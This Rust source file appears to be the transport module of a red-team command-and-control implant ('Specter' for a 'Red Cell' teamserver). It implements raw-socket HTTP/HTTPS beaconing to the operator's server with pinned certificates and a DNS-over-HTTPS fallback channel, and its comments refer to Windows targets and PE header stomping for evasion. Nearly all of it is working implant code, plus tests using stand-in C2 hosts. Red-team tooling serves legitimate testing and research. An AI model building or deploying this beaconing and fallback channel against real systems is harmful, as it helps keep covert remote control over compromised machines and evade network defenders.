//! Transport layer for communicating with the Red Cell teamserver.
//!
//! Provides two concrete transports:
//! - [`HttpTransport`] — direct HTTP/HTTPS callbacks (primary)
//! - [`DohTransport`] — DNS-over-HTTPS fallback (see [`crate::doh_transport`])
//!
//! [`FallbackTransport`] tries the HTTP transport first and automatically
//! retries via DoH when HTTP fails and a `doh_domain` is configured.

use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use tracing::{debug, warn};

use red_cell_common::crypto::ecdh::AgentTransport;

use crate::config::SpecterConfig;
use crate::doh_transport::{DohProvider, DohTransport};
use crate::error::SpecterError;

/// Parse a URL into (scheme, host, port, path).
fn parse_url(url: &str) -> Result<(&str, &str, u16, &str), SpecterError> {
    let (scheme, rest) = url
        .split_once("://")
        .ok_or_else(|| SpecterError::Transport(format!("invalid URL (no scheme): {url}")))?;
    let default_port = match scheme {
        "http" => 80u16,
        "https" => 443u16,
        _ => return Err(SpecterError::Transport(format!("unsupported scheme: {scheme}"))),
    };
    // Split host:port from path
    let (authority, path) = match rest.find('/') {
        Some(i) => (&rest[..i], &rest[i..]),
        None => (rest, "/"),
    };
    let (host, port) = match authority.rsplit_once(':') {
        Some((h, p)) => (h, p.parse::<u16>().unwrap_or(default_port)),
        None => (authority, default_port),
    };
    Ok((scheme, host, port, path))
}

/// HTTP transport using raw blocking TCP sockets.
///
/// This deliberately avoids `reqwest` / async I/O completion ports which exhaust
/// the Windows non-paged pool on low-RAM VMs (WSAENOBUFS / os error 10055).
/// For plain HTTP callbacks (the common C2 case) this is all we need.
/// HTTPS is supported via rustls when a pinned cert is configured.
#[derive(Debug)]
pub struct HttpTransport {
    callback_url: String,
    user_agent: String,
    pinned_cert_pem: Option<String>,
}

impl HttpTransport {
    /// Create a new HTTP transport from the given agent configuration.
    pub fn new(config: &SpecterConfig) -> Result<Self, SpecterError> {
        Ok(Self {
            callback_url: config.callback_url.clone(),
            user_agent: config.user_agent.clone(),
            pinned_cert_pem: config.pinned_cert_pem.clone(),
        })
    }

    /// Send raw packet bytes to the teamserver and return the response body.
    pub async fn send(&self, packet: &[u8]) -> Result<Vec<u8>, SpecterError> {
        debug!(url = %self.callback_url, packet_len = packet.len(), "sending packet");

        // Execute HTTP POST directly on the calling thread using blocking
        // sockets. We deliberately avoid spawning threads because:
        // 1. tokio::spawn_blocking fails on cross-compiled Windows (os error 193)
        // 2. std::thread::spawn fails after PE header stomping (same error)
        // 3. The agent uses a current_thread runtime, so blocking is acceptable
        //    — the agent loop is sequential (checkin → get-job → dispatch)
        // Raw blocking TcpStream uses zero async I/O completion ports and
        // minimal non-paged pool, making it ideal for low-RAM Windows targets.
        let result = http_post_blocking(
            &self.callback_url,
            &self.user_agent,
            packet,
            self.pinned_cert_pem.as_deref(),
        );

        match result {
            Ok(resp) => {
                debug!(response_len = resp.len(), "received response");
                Ok(resp)
            }
            Err(e) => {
                warn!(error = %e, "HTTP transport failed");
                Err(SpecterError::Transport(e))
            }
        }
    }
}

/// Perform a blocking HTTP POST using raw TCP (plain HTTP) or rustls (HTTPS).
fn http_post_blocking(
    url: &str,
    user_agent: &str,
    body: &[u8],
    pinned_cert_pem: Option<&str>,
) -> Result<Vec<u8>, String> {
    let (scheme, host, port, path) = parse_url(url).map_err(|e| e.to_string())?;

    match scheme {
        "http" => http_post_plain(host, port, path, user_agent, body),
        "https" => http_post_tls(host, port, path, user_agent, body, pinned_cert_pem),
        _ => Err(format!("unsupported scheme: {scheme}")),
    }
}

/// Plain HTTP POST over a blocking TcpStream.
fn http_post_plain(
    host: &str,
    port: u16,
    path: &str,
    user_agent: &str,
    body: &[u8],
) -> Result<Vec<u8>, String> {
    let addr = format!("{host}:{port}");
    debug!(%addr, %path, body_len = body.len(), "connecting via plain TCP");

    let mut stream = TcpStream::connect_timeout(
        &addr
            .to_socket_addrs_or_err()?,
        Duration::from_secs(10),
    )
    .map_err(|e| format!("tcp connect error to {addr}: {e}"))?;

    stream
        .set_read_timeout(Some(Duration::from_secs(30)))
        .map_err(|e| format!("set_read_timeout: {e}"))?;
    stream
        .set_write_timeout(Some(Duration::from_secs(30)))
        .map_err(|e| format!("set_write_timeout: {e}"))?;

    let request = format!(
        "POST {path} HTTP/1.1\r\n\
         Host: {host}\r\n\
         User-Agent: {user_agent}\r\n\
         Content-Type: application/octet-stream\r\n\
         Content-Length: {len}\r\n\
         Connection: close\r\n\
         \r\n",
        len = body.len()
    );

    stream
        .write_all(request.as_bytes())
        .map_err(|e| format!("write request: {e}"))?;
    stream
        .write_all(body)
        .map_err(|e| format!("write body: {e}"))?;

    // Read full response
    let mut response = Vec::with_capacity(4096);
    stream
        .read_to_end(&mut response)
        .map_err(|e| format!("read response: {e}"))?;

    parse_http_response(&response)
}

/// HTTPS POST using rustls with a blocking connector.
fn http_post_tls(
    host: &str,
    port: u16,
    path: &str,
    user_agent: &str,
    body: &[u8],
    pinned_cert_pem: Option<&str>,
) -> Result<Vec<u8>, String> {
    use std::convert::TryFrom;

    let _ = rustls::crypto::ring::default_provider().install_default();

    let addr = format!("{host}:{port}");
    let mut tcp = TcpStream::connect_timeout(
        &addr
            .to_socket_addrs_or_err()?,
        Duration::from_secs(10),
    )
    .map_err(|e| format!("tcp connect error to {addr}: {e}"))?;

    tcp.set_read_timeout(Some(Duration::from_secs(30)))
        .map_err(|e| format!("set_read_timeout: {e}"))?;
    tcp.set_write_timeout(Some(Duration::from_secs(30)))
        .map_err(|e| format!("set_write_timeout: {e}"))?;

    // Build rustls client config
    let mut root_store = rustls::RootCertStore::empty();

    if let Some(pem) = pinned_cert_pem {
        let certs = rustls_pemfile::certs(&mut pem.as_bytes())
            .collect::<Result<Vec<_>, _>>()
            .map_err(|e| format!("parse pinned cert PEM: {e}"))?;
        for c in certs {
            root_store.add(c).ok();
        }
    } else {
        root_store.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    }

    let config = rustls::ClientConfig::builder()
        .with_root_certificates(root_store)
        .with_no_client_auth();

    let server_name = rustls::pki_types::ServerName::try_from(host.to_string())
        .map_err(|e| format!("invalid server name: {e}"))?;

    let mut conn = rustls::ClientConnection::new(Arc::new(config), server_name)
        .map_err(|e| format!("rustls client connection: {e}"))?;

    let mut tls = rustls::Stream::new(&mut conn, &mut tcp);

    let request = format!(
        "POST {path} HTTP/1.1\r\n\
         Host: {host}\r\n\
         User-Agent: {user_agent}\r\n\
         Content-Type: application/octet-stream\r\n\
         Content-Length: {len}\r\n\
         Connection: close\r\n\
         \r\n",
        len = body.len()
    );

    tls.write_all(request.as_bytes())
        .map_err(|e| format!("TLS write request: {e}"))?;
    tls.write_all(body)
        .map_err(|e| format!("TLS write body: {e}"))?;

    let mut response = Vec::with_capacity(4096);
    tls.read_to_end(&mut response)
        .map_err(|e| format!("TLS read response: {e}"))?;

    parse_http_response(&response)
}

/// Parse HTTP response: strip headers, return body.
fn parse_http_response(raw: &[u8]) -> Result<Vec<u8>, String> {
    // Find the header/body boundary
    let boundary = b"\r\n\r\n";
    let split = raw
        .windows(4)
        .position(|w| w == boundary)
        .ok_or_else(|| "no header/body boundary in HTTP response".to_string())?;

    let headers = &raw[..split];
    let body = &raw[split + 4..];

    // Check status line
    let header_str = String::from_utf8_lossy(headers);
    let status_line = header_str.lines().next().unwrap_or("");
    if !status_line.contains(" 200 ") && !status_line.contains(" 200\r") {
        if status_line.contains(" 404") {
            // 404 is common on C2 listeners during initial checkin
            return Err(format!("teamserver returned HTTP 404"));
        }
        return Err(format!("teamserver returned non-200: {status_line}"));
    }

    // Check for chunked transfer encoding
    if header_str.to_ascii_lowercase().contains("transfer-encoding: chunked") {
        return decode_chunked(body);
    }

    Ok(body.to_vec())
}

/// Decode HTTP chunked transfer encoding.
fn decode_chunked(data: &[u8]) -> Result<Vec<u8>, String> {
    let mut result = Vec::new();
    let mut pos = 0;

    while pos < data.len() {
        // Find the chunk size line
        let line_end = data[pos..]
            .windows(2)
            .position(|w| w == b"\r\n")
            .ok_or_else(|| "chunked: no CRLF after size".to_string())?;

        let size_str = String::from_utf8_lossy(&data[pos..pos + line_end]);
        let chunk_size = usize::from_str_radix(size_str.trim(), 16)
            .map_err(|e| format!("chunked: invalid size '{size_str}': {e}"))?;

        pos += line_end + 2; // skip size + CRLF

        if chunk_size == 0 {
            break; // last chunk
        }

        let chunk_end = pos + chunk_size;
        if chunk_end > data.len() {
            return Err("chunked: chunk extends past data".to_string());
        }

        result.extend_from_slice(&data[pos..chunk_end]);
        pos = chunk_end + 2; // skip chunk data + CRLF
    }

    Ok(result)
}

/// Format a reqwest error including its full source chain.
/// Kept for backward compat with tests that reference it.
pub(crate) fn format_reqwest_error(e: &reqwest::Error) -> String {
    use std::error::Error as StdError;
    let mut msg = e.to_string();
    let mut src: Option<&dyn StdError> = e.source();
    while let Some(cause) = src {
        msg.push_str(": ");
        msg.push_str(&cause.to_string());
        src = cause.source();
    }
    msg
}

/// Helper trait to convert address string to SocketAddr.
trait ToSocketAddrsExt {
    fn to_socket_addrs_or_err(&self) -> Result<std::net::SocketAddr, String>;
}

impl ToSocketAddrsExt for String {
    fn to_socket_addrs_or_err(&self) -> Result<std::net::SocketAddr, String> {
        use std::net::ToSocketAddrs;
        self.to_socket_addrs()
            .map_err(|e| format!("resolve {self}: {e}"))?
            .next()
            .ok_or_else(|| format!("no addresses for {self}"))
    }
}

/// Transport that tries HTTP first and falls back to DoH on failure.
///
/// When no `doh_domain` is configured, behaviour matches
/// [`HttpTransport::send`] (no DoH retry).
///
/// The DoH client (HTTPS to a public resolver) is built **lazily** on the first
/// HTTP failure so startup stays aligned with non-DoH agents until fallback
/// is needed.
#[derive(Debug)]
pub struct FallbackTransport {
    http: HttpTransport,
    doh_domain: Option<String>,
    doh_provider: DohProvider,
    /// Filled on first HTTP failure when [`Self::doh_domain`] is set.
    doh: Mutex<Option<Arc<DohTransport>>>,
}

impl FallbackTransport {
    /// Build a `FallbackTransport` from agent configuration.
    pub fn new(config: &SpecterConfig) -> Result<Self, SpecterError> {
        let http = HttpTransport::new(config)?;
        Ok(Self {
            http,
            doh_domain: config.doh_domain.clone(),
            doh_provider: config.doh_provider,
            doh: Mutex::new(None),
        })
    }

    /// Send `packet` to the teamserver.
    pub async fn send(&self, packet: &[u8]) -> Result<Vec<u8>, SpecterError> {
        match self.http.send(packet).await {
            Ok(resp) => Ok(resp),
            Err(http_err) => {
                let Some(domain) = self.doh_domain.as_ref() else {
                    warn!(
                        http_error = %http_err,
                        "HTTP transport failed; DNS-over-HTTPS fallback is disabled (no doh_domain in agent config)"
                    );
                    return Err(http_err);
                };
                let doh = {
                    let mut slot = self.doh.lock().map_err(|_| {
                        SpecterError::Transport(
                            "DoH client initialization mutex poisoned".to_owned(),
                        )
                    })?;
                    if slot.is_none() {
                        *slot =
                            Some(Arc::new(DohTransport::new(domain.clone(), self.doh_provider)?));
                    }
                    slot.as_ref()
                        .ok_or_else(|| {
                            SpecterError::Transport(
                                "DoH transport missing after initialization".to_owned(),
                            )
                        })?
                        .clone()
                };
                warn!(
                    http_error = %http_err,
                    "HTTP transport failed — retrying via DNS-over-HTTPS fallback"
                );
                doh.send(packet).await
            }
        }
    }
}

impl AgentTransport for FallbackTransport {
    fn send(
        &self,
        packet: &[u8],
    ) -> impl std::future::Future<Output = Result<Vec<u8>, String>> + Send {
        async { Self::send(self, packet).await.map_err(|e| e.to_string()) }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::SpecterConfig;

    #[test]
    fn transport_creation_succeeds_with_default_config() {
        let config = SpecterConfig::default();
        assert!(HttpTransport::new(&config).is_ok());
    }

    #[test]
    fn url_parser_http() {
        let (scheme, host, port, path) = parse_url("http://192.168.1.1:19100/").unwrap();
        assert_eq!(scheme, "http");
        assert_eq!(host, "192.168.1.1");
        assert_eq!(port, 19100);
        assert_eq!(path, "/");
    }

    #[test]
    fn url_parser_https_default_port() {
        let (scheme, host, port, path) = parse_url("https://example.com/callback").unwrap();
        assert_eq!(scheme, "https");
        assert_eq!(host, "example.com");
        assert_eq!(port, 443);
        assert_eq!(path, "/callback");
    }

    #[test]
    fn url_parser_no_path() {
        let (_, _, _, path) = parse_url("http://localhost:8080").unwrap();
        assert_eq!(path, "/");
    }

    #[test]
    fn parse_simple_200_response() {
        let resp = b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nhello";
        let body = parse_http_response(resp).unwrap();
        assert_eq!(body, b"hello");
    }

    #[test]
    fn parse_404_response() {
        let resp = b"HTTP/1.1 404 Not Found\r\nContent-Length: 9\r\n\r\nnot found";
        let err = parse_http_response(resp).unwrap_err();
        assert!(err.contains("404"));
    }

    #[test]
    fn parse_chunked_response() {
        let resp = b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n6\r\n world\r\n0\r\n\r\n";
        let body = parse_http_response(resp).unwrap();
        assert_eq!(body, b"hello world");
    }

    #[test]
    fn fallback_transport_without_doh_domain_creates_ok() {
        let config = SpecterConfig::default();
        assert!(FallbackTransport::new(&config).is_ok());
    }

    #[test]
    fn fallback_transport_with_doh_domain_creates_ok() {
        let config =
            SpecterConfig { doh_domain: Some("c2.example.com".to_string()), ..Default::default() };
        let t = FallbackTransport::new(&config).expect("FallbackTransport creation");
        assert!(
            t.doh.lock().expect("lock").is_none(),
            "DoH client is lazy — not built until first HTTP failure"
        );
    }

    #[test]
    fn fallback_transport_without_doh_domain_has_no_doh() {
        let config = SpecterConfig { doh_domain: None, ..Default::default() };
        let t = FallbackTransport::new(&config).expect("FallbackTransport creation");
        assert!(t.doh_domain.is_none());
        assert!(t.doh.lock().expect("lock").is_none());
    }
}
